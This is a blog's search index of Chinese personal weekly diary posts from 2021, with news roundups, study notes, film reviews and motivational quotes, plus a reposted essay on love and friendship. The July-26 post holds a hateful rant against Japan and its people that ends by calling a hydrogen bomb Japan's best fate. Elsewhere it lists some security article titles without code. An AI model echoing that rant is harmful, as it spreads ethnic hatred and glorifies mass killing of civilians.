<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>生活周报-Sep-20-to-Oct-1</title>
    <link href="/2021/10/01/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-Sep-20-to-Oct-1_new/"/>
    <url>/2021/10/01/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-Sep-20-to-Oct-1_new/</url>
    
    <content type="html"><![CDATA[<h1 id="时讯"><a href="#时讯" class="headerlink" title="时讯"></a>时讯</h1><ol><li>国庆节，中华人民共和国成立 72 周年。</li><li>中国科学家首次实现人工合成淀粉。</li><li>天宫一号空间站宇航员顺利返航。</li><li>中秋奇妙游&amp;大湾区晚会</li></ol><p><img src="https://image.hackerjerry.top/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-Sep-20-to-Oct-1-1.png#clientId=ubcd8be0e-4640-4&from=paste&id=udcd87ec5&margin=%5Bobject%20Object%5D&name=image.png&originHeight=720&originWidth=720&originalType=url%E2%88%B6=1&size=638485&status=done&style=none&taskId=u35cbbdff-72ce-4295-82b3-0084c448f82" alt="image.png"></p><h1 id="小事"><a href="#小事" class="headerlink" title="小事"></a>小事</h1><ol><li>我们的征途是星辰大海！</li></ol><p>生活的点滴记录</p><h1 id="本周收藏"><a href="#本周收藏" class="headerlink" title="本周收藏"></a>本周收藏</h1><h2 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h2><p>看到了哪些好文？</p><h2 id="剧集"><a href="#剧集" class="headerlink" title="剧集"></a>剧集</h2><ol><li>星际穿越</li><li>肖申克的救赎</li><li>守望者</li></ol><h2 id="摘录"><a href="#摘录" class="headerlink" title="摘录"></a>摘录</h2><p>深度思考</p><h2 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h2><p>又学了哪些新知识?</p><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>关于人生，关于体验</p><p><img src="https://image.hackerjerry.top/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-Sep-20-to-Oct-1-2.png#clientId=ubcd8be0e-4640-4&from=paste&id=u046c5556&margin=%5Bobject%20Object%5D&name=image.png&originHeight=720&originWidth=720&originalType=url%E2%88%B6=1&size=536258&status=done&style=none&taskId=ua24e7d67-e0f5-49d7-a7c4-53f92f6a0a0" alt="image.png"></p>]]></content>
    
    
    <categories>
      
      <category>周报</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【转载】爱情和友情的区别是什么</title>
    <link href="/2021/08/21/%E3%80%90%E8%BD%AC%E8%BD%BD%E3%80%91%E7%88%B1%E6%83%85%E5%92%8C%E5%8F%8B%E6%83%85%E7%9A%84%E5%8C%BA%E5%88%AB%E6%98%AF%E4%BB%80%E4%B9%88_new/"/>
    <url>/2021/08/21/%E3%80%90%E8%BD%AC%E8%BD%BD%E3%80%91%E7%88%B1%E6%83%85%E5%92%8C%E5%8F%8B%E6%83%85%E7%9A%84%E5%8C%BA%E5%88%AB%E6%98%AF%E4%BB%80%E4%B9%88_new/</url>
    
    <content type="html"><![CDATA[<p>tags: []<br>categories: [知乎]<br>index_img: “<a href="https://image.hackerjerry.top/dddd-4.jpg&quot;">https://image.hackerjerry.top/dddd-4.jpg&quot;</a><br>​</p><hr><p>那夜我看到了你的忧虑与顾忌，我虽察觉到你的问题所在，但忍住没说，因为这是一个值得慎重考虑的话题，我希望能更慎重地给你建议，所以采用了文字的方式来回应你，可能你不能一下子理解我在说什么，但文字的好处就在于它能被留下，这些道理现在你不懂没关系，记住它，总有一天用得上。</p><p><strong>（一）你不必感到羞愧，因为那不是爱情</strong><br>你和我说你现在同时在接触好几个女生，总有一种罪恶感，搞得自己好像很花心。<br>​</p><p>我问你你和那些女生都聊些什么？你告诉我只是聊她们和你的交集，骑车、话剧、动漫、音乐、哲学。。。<br>她们总有一个闪光点让你想要靠近。</p><p>我又问你那还拓展出来聊别的不？你和我说：不会，怕浪费时间，有些东西估计和她们聊她们估计也不懂，我只和她们聊她们懂的东西。<br>​</p><p>你看，你觉得聊聊大家都感兴趣的东西就挺好，也没想着进一步发展，动机这么纯，怎么是爱情？<br>​</p><p>其他男生都是靠共同话题打开其他话题，然后进入到情感话题把对方攻陷了，他们就是带着这种把女生把到手的目的去和女生聊天的。<br>​</p><p>人家那叫谈恋爱，你这叫谈兴趣。<br>​</p><p>和别人聊聊兴趣爱好，这和 ta 的性别有关系吗？难道你和男同学聊 Dota 就是为了和他们搅基吗？我想不是吧。<br>​</p><p>多几个朋友聊天，哪怕是女生，又有什么关系。<br>​</p><p>你只是想把自己关于这个兴趣上感受到的快乐分享给更多人，你何必感到羞愧呢？<br><strong>（二）有些事，能完成它的并不只有爱情</strong><br>你和我说，有时候真希望能找一个女生，倾吐所有自己对这个世界的困惑和社会的忧愁。<br>​</p><p>我问你为什么不和我说，不和其他的朋友说。<br>​</p><p>你告诉我：“这些事情太沉重，不希望你们担心”。<br>​</p><p>你为何要这么善良，善良到只愿与我们分享你的快乐，却把悲伤全留给自己。<br>​</p><p>我见过你为了友谊舍付出了那么多，为何你不愿别人在你伤痛的时候也帮帮你？<br>​</p><p>你总说你自己能解决，需要的是一些反思的时间。<br>​</p><p>你那么自私，自私到不愿分我们一丁点痛苦。<br>​</p><p>你觉得爱情是自私的，所以允许你自私一点，去诉说那些困扰了你很久的心事。<br>​</p><p>你都不愿我们去承受那些伤痛，你怎么忍心让一个爱你的女孩去承受这些？<br>​</p><p>爱是为了甜蜜，不是为了苦涩。<br>​</p><p>同甘共苦，并不是仅仅只有爱情能做到，友情也能！<br>​</p><p>我就在这里，我可以愿意听你述说你内心的忧愁，哪怕我不能帮你解决它，说出来总也能减轻一些压力。<br><strong>（三）我所理解的爱情</strong><br>你不是也读过《爱的艺术》么？爱是积极关心和帮助对方成长。<br>​</p><p>但现在有多少情侣，打情骂俏、总想着出去看电影、吃饭，有事没事都腻在一起，不断压缩着独处的时间，压缩着自我成长的时间。<br>​</p><p>等他们腻了，倦了，分了。剩下什么？用最宝贵的青春去交换所谓的甜蜜回忆，可再甜蜜也抵不过现实的残酷啊！<br>​</p><p>我只希望他们多年后不要咒骂，咒骂对方在自己最该努力的时间，让自己沉迷于甜蜜而忘了去努力。<br>​</p><p>当然我身边也有些好例子，他们在一起做得最多的事情就是一起自习。有的男生本来不怎么爱学习，可在女朋友的督促下也常常去自习室。有的女生本来不爱运动，在男朋友的带动下也经常去夜跑。他们从未要求对方要带自己去外面吃饭、看电影，只是晚饭后牵着对方的手，在启真湖畔散散步，聊聊天。没话聊了就回自习室自习。<br>谈这么一场“无聊”的恋爱，不也挺好的么？<br>​</p><p>你肯定要喷我一点激情也没有，但谁说爱一定要炽热？<br>​</p><p>爱情不是沸腾你体内的多巴胺，虽然你曾和我说一年前那种心跳不止的心情，可又能持续多久呢？你不怕得心脏病？<br>​</p><p>别整天幻想着那些无聊青春剧的情节了，真正的爱情一定平淡无奇，但那份平淡里所蕴含的力量，不是那些炽热而短暂的烈火能比的。<br>​</p><p>记住：你不是为了去寻找刺激而去恋爱，而是为了给心找一个归宿。让躁动的心平静下来。<br>​</p><p>你是一个聪明但急躁的人，急躁的人做不成大事。<br>​</p><p>愿你能找到一个包容又智慧的姑娘，静静你那躁动的心。让你能好好沉淀，慢一些，反而会成功得快一些。<br><strong>（四）爱情是互补，友情是共鸣</strong><br>你肯定想问我，那要怎么去找一份真爱，我知道你对自己有一定的了解，那就去找那个与自己互补的人。<br>​</p><p>我并不是说你要去找一个和你观点不同的人，整天争来争去补充自己的观点。<br>​</p><p>相反，互补需要两个人的核心价值观相同，且明白自己的优势与弱势，用自己的优势去弥补对方的劣势，用对方<br>的优势弥补自己的劣势。<br>​</p><p>这样的两个人不会争吵，因为他们不在乎生活里的小摩擦。而且更相信对方，因为他们知道在共同面对一个困难<br>时，该听谁的主意。<br>​</p><p>有人说爱是包容对方所有的缺点，我想有一定道理，但不完全正确，我觉得应该改成爱是接受对方所有的缺点，并努力帮 ta 改掉这些缺点。<br>​</p><p>因为包容解决不了问题，你可能不会爱 ta 一辈子，你所能做的只是帮助 ta，帮助 ta 变得更独立，变得越来越不需要依赖你。<br>​</p><p>或许多年后 ta 身边站着的不是你，但我相信 ta 在心里一直感谢你。<br>​</p><p>有时候你遇到一个她，她似乎就是一个另一个性别的你，她喜欢你所有喜欢的东西，她理解你的一切，和她在一起你是那么的开心。<br>​</p><p>那种开心冲昏了你的头脑，让你误认为那是爱情。<br>有好多人就是这样走在了一起。<br>​</p><p>可两个兴趣点完全相同的人如果腻在一起，总有一天会无聊的，因为他们知道对方在想什么，他们需要一些新意。<br>​</p><p>这种感情应该成为友情，你不要奢望对方给你的太多，在一起时能产生共鸣的快乐，就够了，别那么自私地想占有对方的全部。<br>​</p><p>我不反对你以后心里装着好几个女性朋友，但你以后心里一定只能有一个女朋友，别错把友情当爱情。</p><p><strong>（五）是男人就要耐得住寂寞</strong><br>你现在虽然单身，但千万不要因为寂寞而去找另一半，不断丰富自己，不断认识自己，总有一天你会遇到与你互补的她。<br>​</p><p>而且你有着那么多可以做的事情，你对那么多东西感兴趣，你又喜欢书写自己的故事。<br>​</p><p>那就好好去感受吧，生活就是你最好的素材，在生命中感受最敏感的时刻好好去感受这个世界，然后用你的文字留住自己的经历和感受。<br>​</p><p>虽然写作时我们常常是寂寞的，但如果耐不住这份寂寞，多年后我们又怎么能回味到这文字里的那些酸甜苦辣。<br>耐得住寂寞的人才能等得到真爱。<br>​</p><p>祝早日找到适合你的她。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>生活周报-Aug-9-to-15</title>
    <link href="/2021/08/16/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-Aug-9-to-15_new/"/>
    <url>/2021/08/16/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-Aug-9-to-15_new/</url>
    
    <content type="html"><![CDATA[<h1 id="时讯"><a href="#时讯" class="headerlink" title="时讯"></a>时讯</h1><ol><li>霍尊被锤</li><li>河南《七夕奇妙游》</li><li>阿里女员工被侵犯一案结束</li><li>阿富汗塔利班上台，原总统辞职</li><li>英国药检阳性，中国有望获得 4*100 铜牌递补，实现 0 的飞跃</li></ol><h1 id="小事"><a href="#小事" class="headerlink" title="小事"></a>小事</h1><ol><li><del>中科大联系不到尚有名额的导师，很烦。</del>老师主动发邮件联系了。。</li><li>终于把那颗蛀牙拔了，心头之患-1。</li><li><del>上交网安夏令营凉了</del>，我好伤心……去上海这两趟可是花了我 4000 大洋啊啊啊啊啊，<del>为啥不发 waiting list 了呜呜呜。</del>上帝啊，我和上交真的是无缘了吗……我哭了……（虚惊一场，拿到了）</li><li>求求老天让孩子快点拿到一个满意的 offer 吧，孩子努力了这么久也应该有回报了吧。（感谢上帝，感谢先人）</li><li>小悟空，助我一臂之力！</li></ol><p>​</p><p><img src="https://image.hackerjerry.top/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-Aug-9-to-15-1.jpeg#clientId=u3431b4c3-085a-4&from=drop&id=ua2273602&margin=%5Bobject%20Object%5D&name=mmexport1628330008465.jpg&originHeight=720&originWidth=720&originalType=binary%E2%88%B6=1&size=310277&status=done&style=none&taskId=u238c0330-b874-483d-b854-27565f104ce" alt="mmexport1628330008465.jpg"></p><h1 id="本周收藏"><a href="#本周收藏" class="headerlink" title="本周收藏"></a>本周收藏</h1><h2 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h2><ol><li>Graph Attention Network 的本质是什么？</li><li>验证码在黑灰产对抗中的角色和实践</li><li>如何优雅的向导师表示这周科研没什么进展？</li><li>WAF 攻防实践</li></ol><h2 id="剧集"><a href="#剧集" class="headerlink" title="剧集"></a>剧集</h2><ol><li>扫黑风暴</li><li>瑞克和莫蒂第五季</li><li>大护法</li><li>日剧《班会》–日本真的是个变态的国家</li></ol><h2 id="摘录"><a href="#摘录" class="headerlink" title="摘录"></a>摘录</h2><ol><li>除了书本学问，人生处处是学问。</li></ol><h2 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h2><ol><li>并查集、双指针、滑动窗口</li><li>贪心</li></ol><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><ol><li>做重要决定之前，一定要三思！三思！写到纸上优劣情况再做决定，还要和家人商量！</li></ol><p>​</p><p><img src="https://image.hackerjerry.top/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-Aug-9-to-15-2.jpeg#clientId=uc4ad01ba-c4cc-4&from=drop&id=u616628f2&margin=%5Bobject%20Object%5D&name=1630914702089.jpg&originHeight=588&originWidth=640&originalType=binary%E2%88%B6=1&size=222007&status=done&style=none&taskId=u9f6a41b7-180f-4452-9edd-d83e64b51b8" alt="1630914702089.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>周报</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>生活周报-July-26</title>
    <link href="/2021/07/27/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-July-26_new/"/>
    <url>/2021/07/27/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-July-26_new/</url>
    
    <content type="html"><![CDATA[<p><img src="https://image.hackerjerry.top/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-July-26-1.jpeg#clientId=u1f8968b0-1af6-4&from=drop&id=x0Rv5&margin=%5Bobject%20Object%5D&name=1627386698527.jpg&originHeight=1080&originWidth=1080&originalType=binary%E2%88%B6=1&size=743632&status=done&style=none&taskId=u0f0c91fc-4453-4681-bdc3-66c1f2d3869" alt="1627386698527.jpg"></p><h1 id="时讯"><a href="#时讯" class="headerlink" title="时讯"></a>时讯</h1><ol><li>南京突发疫情，传染源为德尔塔新冠病毒，已经蔓延到 7 省</li><li>鸿星尔克捐款 5000 万，直播间被网友挤爆，野性消费，线下店亦是被一扫而空</li><li>东京奥运会阴间开幕式，真是污染眼睛</li><li>台风烟花登陆浙江，可能会二次登陆上海</li><li>奥运会首金是清华大三杨倩获得，27 日杨倩又获得一枚混合团体金牌</li><li>许昕刘诗雯混双不敌日本队，获得银牌</li><li>水谷隼吹球，伊藤美诚摸桌子，裁判装作无视</li><li>马龙成功双圈大满贯，获得男单金牌</li><li>张雨霏获得两金两银，其中女子 4*200 打破世界纪录</li></ol><h1 id="小事"><a href="#小事" class="headerlink" title="小事"></a>小事</h1><ol><li>我愈发的对日本的整个国家和民族产生深深的厌恶之情。从奥运会开幕式可以看出，这个影视剧里美好静谧的国家，其实早已是金玉其外，败絮其中。组织低效，贪污腐败，推脱甩锅，随便开除，鞠躬致歉，好一个顾小节而无大义的日本啊。只是因为资金问题就可以把核废水排进太平洋，你们的美国爸爸呢？现在去哪里了？反手就禁止海产品进口，双标的不要不要。再看运动会赛程，乒乓球不按照国际乒联的规定，将场地缩小，刻意添加规则限制中国队，水谷隼犯规裁判视而不见，许昕吹球就直接黄牌，赤裸裸的恶心人。再说那个伊藤美诚，表情丰富，眼神里透出狠毒，赢了球和小人得志一般。从日本展示出来的，从首相，到大臣，再到运动员、裁判，众多的普通人，日本早已不是那个借着美国东风腾飞的亚洲四小龙了，内部腐朽不堪，摇摇欲坠。如今的日本，赌输了国运，那么只有每况愈下的唯一结局了，我只希望它不要让日本军国主义复辟，再宁为玉碎不为瓦全拉全人类给它陪葬。说到底，氢弹就是日本最好的归宿，那火红的，明亮的太阳照耀着日本，将无穷的热量洒向每一寸土地，就像它们的国旗。</li><li>去上海这几天，饭根本就没吃好，掉了三斤肉，唉。</li><li>c 楼大爷说什么要清书，我们这些天真的，遵守规则的大学生就乖乖的把书都搬回了宿舍。然后呢？第二天一大早就开门了，您清了什么书？您打扫了什么卫生？就是让我们把腾出来的座位拱手相让？看不懂，但我大受震撼。</li><li>打了新冠疫苗第一针，之前网上说的不良反应倒是没有遇见，甚至连困都不困，生龙活虎。</li><li>回来之后颓废了两天，意志力极度低沉，完全不想做任何与学习有关的事情，光刷手机、看视频，在宿舍窝着，把生活过的一团糟。我是谁，我在哪？</li></ol><p><img src="https://image.hackerjerry.top/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-July-26-2.jpeg#clientId=u1f8968b0-1af6-4&from=drop&id=YNCpg&margin=%5Bobject%20Object%5D&name=1627386609392.jpg&originHeight=2400&originWidth=1080&originalType=binary%E2%88%B6=1&size=601783&status=done&style=none&taskId=u41bff44e-d3b7-456b-bbf1-080d74ed71b" alt="1627386609392.jpg"></p><h1 id="本周收藏"><a href="#本周收藏" class="headerlink" title="本周收藏"></a>本周收藏</h1><h2 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h2><ol><li><a href="https://mp.weixin.qq.com/s/uJmq_6uS9-FbLT1Mzpq7Aw">PPT 字效高端修改操作</a></li><li><a href="https://mp.weixin.qq.com/s/AT2NV6NQAZeM2I_TMgEyuQ">Redis 常见漏洞利用方法总结</a></li><li>字节实习面经</li></ol><h2 id="剧集"><a href="#剧集" class="headerlink" title="剧集"></a>剧集</h2><ol><li><strong>洛基 1-6</strong></li></ol><p>感觉美剧版洛基有点搞笑<br>神圣时间线，TVA，多元宇宙，yysy，美国的特效做的真不错。</p><ol start="2"><li><strong>2008 年北京奥运会开幕会</strong></li></ol><p>重看了 2008 年的北京奥运会开幕式，真的 10 年后看，仍然震撼。史上最好，美轮美奂，东方大国，我难以用语言形容这场宏大的奥运开幕式，只能说它，无可挑剔。从 56 个民族的小朋友托举着五星红旗交给仪仗队，再到红旗冉冉升起，祝福我们亲爱的祖国，从今走向繁荣富强。<br>中国的宏大，包容，和谐，历史悠长被每一个节目表现得淋漓尽致。<br>中国红，永远是世界上最耀眼的那抹颜色。<br>当我回念往昔，会永远记得 08 年那个夏天，北京奥运会给我们的感动和力量。<br>试看未来的寰宇，必将是赤旗的世界！</p><ol start="3"><li><strong>魔女宅急便</strong></li></ol><p>这是一部宫崎骏的电影，这么多年我还只看过千与千寻和龙猫，所以现在准备补一下（其实是看到某人的头像于是想看一看的）<br>小魔女的成长历程，画风很温馨，城市生活很真实。这一路上她经历了许多历练，暴雨、闯祸、住不了旅馆、不受人待见、送货出错、失去魔法、听不懂黑猫说话等等，但是琪琪没有退缩，还用一颗美好的善良的心去对待身边的所有人，她从这些经历中获得成长，也给我们启迪：“<strong>所有的成长，都是用未经世事的纯真作为代价</strong>。”<br>琪琪是一个独立的小魔女，整部片子传达出的价值观十分适合让小孩子观看。<br>（琪琪去的那座城市，除了风格是欧式的，其他的元素像是红瓦绿树、碧海蓝天，简直就是青岛好嘛 2333）<br>​</p><h2 id="摘录"><a href="#摘录" class="headerlink" title="摘录"></a>摘录</h2><h3 id="变的更好的标志"><a href="#变的更好的标志" class="headerlink" title="变的更好的标志"></a>变的更好的标志</h3><ol><li><strong>重视自己的健康和快乐</strong></li></ol><p>认真锻炼，坚持体检。每天坚持做一些运动，不断增强自己的免疫力。明白熬夜的坏处，开启规律的作息，不再放纵自己，早早进入甜甜的梦乡。</p><ol start="2"><li><strong>做事积极且自律</strong></li></ol><p>不要被懒惰控制，不要再荒废时光，去钻研有意思的领域，不断提升自己的实力和才华。读书、考证，练书法、学口语，你感兴趣的技能，都可以去尝试。</p><ol start="3"><li><strong>保持干净的气质</strong></li></ol><p>把家里打扫得干干净净、收拾得井井有条，自会福气满满。<br>每周末的时候进行一次大扫除，洗洗床单、换换被罩、晒晒被子。</p><ol start="4"><li><strong>拥有治愈自己的能力</strong></li></ol><p>沮丧低落的时候，能够与自己和解。太累了，记得和自己说一句辛苦了，送自己一点惊喜，告诉自己，坚持下去，你会遇见更多奇妙的景色。</p><ol start="5"><li><strong>懂得控制自己的情绪</strong></li></ol><p>遇到工作难题，既然开心与否都要去做，不如开开心心想办法解决。不传播负面情绪，更不要喋喋不休地抱怨，放宽心，保持乐观。<br>对待家人，更要有个好脾气，不要随意发火，别说伤感情的话，少一点职责，多一点将心比心。</p><ol start="6"><li><strong>心里始终装着善良和温柔</strong></li></ol><p>人活一辈子，要对得起自己的良心，扛起自己的责任，有一份光发一份光，有一份热发一份热。<br>正所谓“爱出者爱返，福往者福来”，怀揣着善意、始终向着光明的你，一定会有更多好运气。</p><h3 id="摆脱油腻"><a href="#摆脱油腻" class="headerlink" title="摆脱油腻"></a>摆脱油腻</h3><p>中年以后，让人变得油腻的，不仅仅是发福的身材和复杂的圈子，更是思想上的贫瘠和学习上的自我放纵。<br>古训有言“人不学，则尘俗生其间，照镜面目可憎，对人语言无味。”<br>再老的人，只要保持着运动、学习的习惯，不那么爱刷存在感，节制干净，都不会有油腻的感觉。<br>​</p><h3 id="走向成熟"><a href="#走向成熟" class="headerlink" title="走向成熟"></a>走向成熟</h3><p>“九牛一毫莫自夸，骄傲自满必翻车”<br>一个人只有放低自己的位置，才能认识到自己的不足，进一步精进自己。<br>技艺的真正秘诀，是要永远当一个初学者。<br>放低自己的位置，不是自卑，不是怯懦，而是一个走向成熟的标志。</p><h3 id="句子"><a href="#句子" class="headerlink" title="句子"></a>句子</h3><ol><li>我曾将青春还给了她，连同指尖弹出的盛夏。</li><li>不要担心老之将至，你老了也一定很可爱。</li><li>“我太文化沙漠了”“没关系，沙漠里也有红柳、胡桃”</li><li>谢谢你的突然出现给我的生活带来了一段特别有意义的日子，祝你平安。</li><li><strong>我本身就是一个不喜欢主动的人，虽然灵魂有趣，但不爱表达。死倔，也慢热，遇到懂我的人是幸运，遇不到也是正常。沉默、喜欢独处、三观正，比你想象的深情，也比你认为的冷漠。</strong></li><li>不要叫我单身狗，我是闪电干饭狼，别拿青春倒插秧，爱情哪有干饭香。</li><li>“请在合适的位置掉头”</li><li>祝你们信念生根，但灵魂自在，往后人生道路宽广，途径的每一个夏天，都草木葱茏，满目生机。</li><li>生活再糟，也不妨碍你越来越好。</li><li>人生三大错觉，一定一定不要自我感觉良好，一定不要高估别人对你的评价，一定一定不要自取其辱！</li></ol><h2 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h2><p>复习了一些</p><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><h3 id="自律-意志力"><a href="#自律-意志力" class="headerlink" title="自律|意志力"></a>自律|意志力</h3><ol><li><strong>自律就是每天 11 点半准时睡觉，六点 45 准时起床，每天按时去健身，每顿饭不碰手机专心吃饭，控制住自己的欲望，把精力投入到可以提升你的未来的事情当中。</strong></li><li>真正有价值的事情都不是轻松舒服就能完成的，那些晨间的寂静，不眠的星光，清醒的克制，孤军奋战的坚持，才是我们意志闪光的时刻。</li><li>单调的攀登动作会感到厌烦，但每一步都更接近顶峰。</li><li>训练意志力：1.<strong>把事情贯彻到底</strong>。属于自我认知–完成胜过完美。2. <strong>不管花多少时间，把事情做好</strong>。属于自我改善–学习钻研和反省总结。3.<strong>做的比你能做的更好</strong>。属于自我超越–在细节上，每天努力一点点。</li></ol><h3 id="做人"><a href="#做人" class="headerlink" title="做人"></a>做人</h3><ol><li>如果你是个过来人，请不要给正在进行的人泼冷水，即使你在这件事上有发言权，也不要觉得他们做的都是小菜一碟。只要一个人在用心地认真地做一件事，不管这件事在你看来多渺小多轻而易举，都值得真心去鼓励。</li><li>温柔不是懦弱，温柔是一种巨人的力量。一个温柔的人，他不轻易发脾气，不容易失望，他愿意友好对待每一个人。即使他的知识层面和储备都远高于你，仍愿意俯下身来听你说生活的琐碎。他们明亮而不刺眼，自信满满又懂得收敛。</li><li>“你太厉害了，连这个都知道。”“我只是比你早一点知道而已，现在你不也知道了。”</li><li>真正的情商高不是圆滑客套，而是温暖真诚，懂得换位思考，让人如沐春风百处不厌。</li><li>我不知道未来我会遇到什么样的人，但我可以肯定的是，无论以后我遇到什么人，她都同样渴望着我优秀。所以我不需要浪费大量时间去回忆过去和幻想未来。我需要的是把所有的时间用来完善自己。只为了遇见你，然后对你说“我知道你很好，但我也不差。”</li><li>三观是用来约束自己而不是用来审视别人的，道德同理。礼义廉耻，可以律己，不可以绳人。</li><li><strong>保持自己的思想和态度的整洁，让生活事事条理清楚且远离拖沓</strong>。</li><li>“及时止损”辞去不合适的工作，退出不合群的圈子，告别不合适的感情，离开不合适的人，<strong>不要过度怀念沉没成本</strong>。</li><li>大家都是有骨气的人，互相讨厌也没关系。</li><li>遇贵人先立业，遇良人先成家，无贵人而自立，无良人而自修，<strong>无能遇贵人无用，无钱遇良人无缘。</strong></li></ol><p><img src="https://image.hackerjerry.top/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-July-26-3.jpeg#clientId=u1f8968b0-1af6-4&from=drop&id=u1db02c38&margin=%5Bobject%20Object%5D&name=1627384861858.jpg&originHeight=1135&originWidth=1046&originalType=binary%E2%88%B6=1&size=277784&status=done&style=none&taskId=u80897df3-34ae-4332-9203-ea1eac25005" alt="1627384861858.jpg"></p><h4 id="不要说"><a href="#不要说" class="headerlink" title="不要说"></a>不要说</h4><ol><li>批评别人喜欢的东西，并不会让别人讨厌这个东西，只会让人讨厌你。</li><li>“这都不知道？”“这都没见过？”“这都没听过？”“不是吧？”</li></ol><h3 id="学习-读书"><a href="#学习-读书" class="headerlink" title="学习|读书"></a>学习|读书</h3><ol><li>读书不光是为了学习知识，更重要的是，学会思考，学会考虑事情之间的逻辑。</li><li>走出去，去经历更大的世界，去不断遇到自己的极限，然后去尝试突破它，突破再突破，当有一天回过头来看的时候，自己已经走出了从未想象想过的前途。</li><li>你可以假装不行，但你不能真不行。</li></ol><h3 id="人生的意义"><a href="#人生的意义" class="headerlink" title="人生的意义"></a>人生的意义</h3><p><img src="https://image.hackerjerry.top/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-July-26-4.jpeg#clientId=u1f8968b0-1af6-4&from=drop&id=u7f9f5733&margin=%5Bobject%20Object%5D&name=1627384921569.jpg&originHeight=778&originWidth=800&originalType=binary%E2%88%B6=1&size=103876&status=done&style=none&taskId=u60ae5f96-ff82-4e08-83c7-3285d4e3487" alt="1627384921569.jpg"><br><img src="https://image.hackerjerry.top/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-July-26-5.jpeg#clientId=u1f8968b0-1af6-4&from=drop&id=u1c1eac39&margin=%5Bobject%20Object%5D&name=1627386350439.jpg&originHeight=1494&originWidth=1080&originalType=binary%E2%88%B6=1&size=399177&status=done&style=none&taskId=u576adb8e-d4fa-4594-9415-4a7800524bb" alt="1627386350439.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>周报</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>生活周报-July-14-to-21</title>
    <link href="/2021/07/21/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-July-14-to-21_new/"/>
    <url>/2021/07/21/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-July-14-to-21_new/</url>
    
    <content type="html"><![CDATA[<h1 id="时讯"><a href="#时讯" class="headerlink" title="时讯"></a>时讯</h1><ol><li>吴亦凡被锤，让子弹飞一会。</li><li>河南遇千年一遇大雨，平均降水量超 200 毫米，郑州受灾严重，铁路全部停运。风雨中，我们守望相助，希望前方人民平安！也感谢所有在天灾前伸出援手的人，你们都是英雄，希望你们都能平安归来！</li><li>东京奥运会即将开幕，日本无力吐槽，整活一套一套的。</li><li>世界最快磁悬浮在青岛试车成功。</li><li>南京机场爆发疫情，南大夏令营改为线上。</li><li>河南卷烟厂也上热搜了</li></ol><h1 id="小事"><a href="#小事" class="headerlink" title="小事"></a>小事</h1><ol><li>又来上海了，希望如愿以偿！</li><li>上海物价真的高，风比青岛还大，云也超大</li><li>下雨天不要骑共享单车！</li></ol><h1 id="本周收藏"><a href="#本周收藏" class="headerlink" title="本周收藏"></a>本周收藏</h1><h2 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h2><ol><li>深度包检测技术介绍_吃素的小动物的博客-CSDN 博客<a href="https://blog.csdn.net/weixin_30654419/article/details/96930279">https://blog.csdn.net/weixin_30654419/article/details/96930279</a></li><li>机器学习在网络流量分类中的应用_dieTicket 的博客-CSDN 博客<a href="https://blog.csdn.net/dieTicket/article/details/106869766">https://blog.csdn.net/dieTicket/article/details/106869766</a></li><li>HTTPS 到底有多复杂，能防止重放攻击吗？ - 知乎<a href="https://zhuanlan.zhihu.com/p/360782536">https://zhuanlan.zhihu.com/p/360782536</a></li><li>P2P 网络及节点发现机制_qukuai 的博客-CSDN 博客_p2p 节点<a href="https://blog.csdn.net/qukuai/article/details/81082421">https://blog.csdn.net/qukuai/article/details/81082421</a></li><li>b+树时间复杂度_leetCode. 二叉搜索树专题(4)_weixin_39598941 的博客-CSDN 博客<a href="https://blog.csdn.net/weixin_39598941/article/details/110570255?utm_medium=distribute.wap_relevant.none-task-blog-baidujs_baidulandingword-1">https://blog.csdn.net/weixin_39598941/article/details/110570255?utm_medium=distribute.wap_relevant.none-task-blog-baidujs_baidulandingword-1</a></li><li><a href="https://mp.weixin.qq.com/s/Gb9SW0Sl63xbQ21pSY_JOg">老生常谈的无字母数字 Webshell 总结</a></li><li><a href="https://mp.weixin.qq.com/s/SWCj9CXOWbkny0A35Lagow">恶意代码流量分析与监测</a></li></ol><h2 id="剧集"><a href="#剧集" class="headerlink" title="剧集"></a>剧集</h2><p>追了哪些剧？<br>-_-哪有时间</p><h2 id="摘录"><a href="#摘录" class="headerlink" title="摘录"></a>摘录</h2><ol><li>来自《觉醒时代》</li></ol><p>我们中国人，思想、性格，有很多的弱点，<br>但是，在我们中国人身上，有其他任何民族都没有的、难以言喻的东西，<br>那就是温良。<br>温良，不是温顺，更不是懦弱，<br>温良是一种力量，是一种同情和人类智慧的力量。<br>大灾面前，更显真情。振臂一呼，无数援手。<br>河南挺住！国家和人民都在你们的身后！</p><ol 